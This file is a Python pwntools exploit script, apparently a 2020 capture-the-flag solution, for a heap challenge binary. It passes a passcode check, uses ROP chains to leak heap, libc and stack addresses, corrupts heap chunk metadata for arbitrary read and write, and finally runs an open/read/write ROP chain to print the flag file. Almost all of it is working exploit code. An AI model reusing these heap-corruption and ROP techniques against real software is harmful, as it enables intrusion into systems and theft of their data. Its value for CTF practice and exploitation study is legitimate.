#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2020 wlz <wlz@kyria>
#
# Distributed under terms of the MIT license.

from pwn import * 

pie  = 1
arch = 64
bps  = [0x000000000000228D]

def change():
    ru("challenge ")
    random = int(re(9, 2)) + 0x12345678
    payload = "01d_6u7_v190r0u5_"+str(random)
    sla('passcode: ', payload)
    
def add(idx, size, con):
    sla("choice>> ", "1")
    sla("idx:", str(idx))
    sla("size", str(size))
    sla("content:", con)

def show(idx):
    sla("choice>> ", "2")
    sla("idx:", str(idx))

def dele(idx):
    sla("choice>> ", "4")
    sla("idx:", str(idx))

ret = 0x653
pop = 0x6ca
read = 0x5ef
leave = 0x737
printf = 0x6a8
strchange = 0x1000
chunk_list = 0x1520

time = 0
def rop(arr, number):
    return flat(number, arr, pop, number, 0x1000, read, leave)


def exp1():
    change()
    add(0, 0x20, 'a')
    add(1, 0x20, 'b')

    payload = flat(ret, ret, ret, ret, ret, ret, ret, pop, 0x653, 0x1000, read, leave)
    sla("choice>> ", "2")
    sa("idx:", payload)
    payload  = rop([pop, strchange, 0, printf], 0x500)
    sl(payload)
    ru("challenge")

syscall3 = 0x77
syscall4 = 0x86
syscall6 = 0xa4
syscall7 = 0xb6

def exp2():
    payload  = rop([pop, chunk_list, 0, printf], 0)
    sl(payload)
    recv()
    heap = u64(re(6, 2).ljust(8, b'\x00'))
    heap = heap - 0x480
    print(hex(heap))
    
    heap1 = heap + 0x480 
    heap2 = heap + 0x4d0

    
    def my_new(size):
        sl(rop([pop, size, 0, syscall3], 0))

    def my_dele(ptr):
        sl(rop([pop, ptr, 0, syscall4], 0))

    def my_show(ptr):
        sl(rop([pop, ptr, 0, syscall7], 0))
    
    def my_edit(ptr, size):
        sl(rop([pop, ptr, size, syscall6], 0))

    my_new(0x500)
    heap3 = heap + 0x520
    my_dele(heap3)

    my_edit(heap1, 0x100000004)
    payload = flat('a' * 0x20, 0, 0x21, heap3, 0x1000)
    sl(payload)

    my_show(heap3)
    ru("ontent: ")
    main_aeran = u64(re(6, 2).ljust(8, b'\x00'))
    print(hex(main_aeran))
    LIBC = main_aeran - 0x1ebbe0
    print("libc: " + hex(LIBC))
    libc = ELF("./libc.so.6")
    env = libc.sym['environ'] + LIBC 


    my_edit(heap2, 0x100000004)
    payload = flat('a' * 0x20, 0, 0x21, env, 0x1000)
    sl(payload)
    my_show(env)
    ru("ontent: ")
    stack = u64(re(6, 2).ljust(8, b'\x00'))
    print(hex(stack))

    stack = stack - 0x140 

    my_new(0x30)
    heap4 = heap3

    my_edit(heap4, 0x100000004)
    sl(flat('./flag\x00'.ljust(0x500, 'v'), 0, 0x21, stack, 0x1000))

    poprax = 0x4a550 + LIBC
    poprdi = 0x26b72 + LIBC
    poprsi = 0x27529 + LIBC
    poprdx = 0x11c371 + LIBC
    syscall = 0x66229 + LIBC

    my_edit(stack, 0x100000004)
    sl(flat(
        # open("./flag")
        poprax, 2, 
        poprdi, heap4, 
        poprsi, 0, 
        poprdx, 0, 0, 
        syscall, 
        # read(3, buf, 0x100)
        poprax, 0, 
        poprdi, 3, 
        poprsi, heap4, 
        poprdx, 0x100, 0, 
        syscall, 
        # write(1, buf, 0x100)
        poprax, 1, 
        poprdi, 1, 
        poprsi, heap4, 
        poprdx, 0x100, 0, 
        syscall
        ))



context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

slog = {'name' : 111}
local = int(sys.argv[1])

if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

if local:
    cn = process('./rbin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote( )

elf = ELF('./bin')

def gdba():
    if local == 0:
        return 0;
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        cmd +=''.join(['b *$rebase({:#x})\n'.format(b) for b in bps])
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])
    gdb.attach(cn,cmd)

re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)
# after a, send b;
from pwnlib.util import cyclic
ff  = lambda arg, f=cyclic.de_bruijn(), l=None :flat(*arg, filler=f, length=l)

def slog_show():
    for i in slog:
        success(i + ' ==> ' + hex(slog[i]))

while 1:
    cn = process("./bin")
    try:
        exp1()
        break
    except:
        sleep(0.2)
        try:
            cn.close()
        except:
            print("none")
exp2()

slog_show()

ia()

